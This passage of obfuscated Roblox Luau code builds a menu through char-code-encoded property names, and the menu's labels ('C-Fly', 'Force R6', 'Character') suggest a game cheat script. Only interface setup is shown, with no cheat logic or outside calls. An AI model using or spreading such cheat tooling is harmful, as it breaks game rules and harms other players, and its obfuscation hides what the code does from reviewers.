_llza[_sc(49,101,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,101,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,57)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,101,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,101,57)]);
_llza[_sc(49,101,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,101,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,101,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,101,55)]);
_llza[_sc(49,101,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,101,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,101,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,101,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,101,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,99)][_sc(78,97,109,101)]=[[CFly]];
_llza[_sc(49,101,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,101,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,100)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,101,99)]);
_llza[_sc(49,101,100)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,101,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,101,100)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,101,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,100)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,101,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101,100)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,101,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,101,100)]);
_llza[_sc(49,101,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,101,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,101,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,101,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,101,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,101,100)]);
_llza[_sc(49,101,102)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,101,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,101,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,101,102)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,101,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,102,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,101,102)]);
_llza[_sc(49,102,48)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,102,48)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,102,49)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,101,102)]);
_llza[_sc(49,102,49)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,102,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,49)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,102,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,102,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,50)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,102,49)]);
_llza[_sc(49,102,50)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,102,50)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,102,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,101,99)]);
_llza[_sc(49,102,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,102,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,102,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,102,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,102,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,102,51)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(49,102,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,51)][_sc(84,101,120,116)]=[[C-Fly]];
_llza[_sc(49,102,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,102,51)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,102,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,102,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,102,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,102,51)]);
_llza[_sc(49,102,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,102,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,102,51)]);
_llza[_sc(49,102,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,102,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,101,99)]);
_llza[_sc(49,102,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,102,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,101,99)]);
_llza[_sc(49,102,55)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(49,102,55)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(49,102,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,55)][_sc(78,97,109,101)]=[[CFlyChanger]];
_llza[_sc(49,102,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,102,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,102,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(49,102,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,102,55)]);
_llza[_sc(49,102,56)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,102,56)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,102,56)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,102,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,102,57)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(49,102,55)]);
_llza[_sc(49,102,57)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,102,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,102,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,102,57)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,102,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,102,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,102,57)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(50)]];
_llza[_sc(49,102,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,102,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,102,57)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,102,57)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(49,102,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,102,57)]);
_llza[_sc(49,102,97)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,102,97)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,102,97)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,102,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,102,57)]);
_llza[_sc(49,102,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,102,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,98)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,102,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,102,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,102,98)]);
_llza[_sc(49,102,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,102,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,102,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,102,57)]);
_llza[_sc(49,102,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,102,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,48)]);
_llza[_sc(49,102,101)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(49,102,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,102,101)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(49,102,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,102,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,102,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(49,102,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,102,102)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(49,102,101)]);
_llza[_sc(49,102,102)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(49,102,102)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(50,48,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,102,101)]);
_llza[_sc(50,48,48)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 102);
_llza[_sc(50,48,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,48)][_sc(78,97,109,101)]=[[characterTab]];
_llza[_sc(50,48,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,48,49)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,49)][_sc(78,97,109,101)]=_sc(99,104,97,114,97,99,116,101,114,83,99,114,105,112,116);
_llza[_sc(50,48,50)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,50)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(50,48,50)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,48,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,51)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,48,51)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,48,51)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,48,51)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(50,48,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(50,48,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,52)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(50,48,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,52)]);
_llza[_sc(50,48,53)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(50,48,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,53)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(50,48,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(50,48,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,48,54)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(50,48,53)]);
_llza[_sc(50,48,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,48,55)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(50,48,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,55)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(50,48,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,48,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,56)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,48,55)]);
_llza[_sc(50,48,56)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,48,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,48,56)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,48,56)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,48,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,48,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,48,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,56)][_sc(84,101,120,116)]=[[Character]];
_llza[_sc(50,48,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,48,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(50,48,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,48,56)]);
_llza[_sc(50,48,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,48,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,48,56)]);
_llza[_sc(50,48,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(50,48,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,48,55)]);
_llza[_sc(50,48,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,48,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,48,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,48,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,98)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(50,48,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,98)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(50,48,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(50,48,98)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(50,48,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,48,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,48,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,48,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,99)][_sc(78,97,109,101)]=[[R6]];
_llza[_sc(50,48,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,48,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,100)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,48,99)]);
_llza[_sc(50,48,100)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,48,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,48,100)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,48,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,100)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,48,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48,100)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,48,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,48,100)]);
_llza[_sc(50,48,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,48,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,48,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,48,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,48,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,100)]);
_llza[_sc(50,48,102)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,48,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,48,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,48,102)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,48,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,49,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,48,102)]);
_llza[_sc(50,49,48)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,49,48)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,49,49)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,48,102)]);
_llza[_sc(50,49,49)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,49,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,49)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,49,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,50)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,49,49)]);
_llza[_sc(50,49,50)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,49,50)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,49,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,48,99)]);
_llza[_sc(50,49,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,49,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,49,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,49,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,49,51)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(50,49,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,51)][_sc(84,101,120,116)]=[[Force R6]];
_llza[_sc(50,49,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,49,51)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,49,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,49,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,49,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,49,51)]);
_llza[_sc(50,49,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,49,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,49,51)]);
_llza[_sc(50,49,53)][_sc(78,97,109,101)]=[[text]];
